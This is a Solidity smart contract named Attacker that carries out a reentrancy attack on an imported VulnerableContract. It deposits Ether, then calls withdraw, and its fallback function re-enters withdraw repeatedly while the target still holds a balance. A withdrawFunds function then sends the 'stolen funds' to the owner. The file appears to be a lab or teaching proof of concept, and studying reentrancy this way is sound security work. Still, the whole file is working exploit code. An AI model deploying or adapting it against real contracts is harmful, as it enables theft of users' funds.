// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./VulnerableContract.sol";

contract Attacker {
    VulnerableContract public vulnerable;
    address public owner;
    uint256 public attackAmount;
    uint256 public totalReceived;  // Variable to track total Ether received

    // Event to emit when totalReceived is updated
    event ReceivedEther(address indexed sender, uint256 amount, uint256 totalReceived);

    constructor(address _vulnerableAddress) {
        vulnerable = VulnerableContract(_vulnerableAddress);
        owner = msg.sender;
        totalReceived = 0;  // Initialize total received to 0
    }

    // Fallback function for reentrancy
    fallback() external payable {
        // Add the received Ether to totalReceived
        totalReceived += msg.value;

        // Emit the event to log the received Ether
        emit ReceivedEther(msg.sender, msg.value, totalReceived);

        if (address(vulnerable).balance >= attackAmount) {
            vulnerable.withdraw(attackAmount);  // Recursively withdraw
        }
    }

    // Initiate the attack with a specified amount
    function attack(uint256 _amount) external payable {
        require(msg.value >= _amount, "Need sufficient Ether to attack");
        attackAmount = _amount;
        vulnerable.deposit{value: _amount}();  // Deposit to vulnerable contract
        vulnerable.withdraw(_amount);  // Start reentrancy attack
    }

    // Withdraw stolen funds
    function withdrawFunds() external {
        require(msg.sender == owner, "Only owner can withdraw");
        payable(owner).transfer(address(this).balance);
    }
}
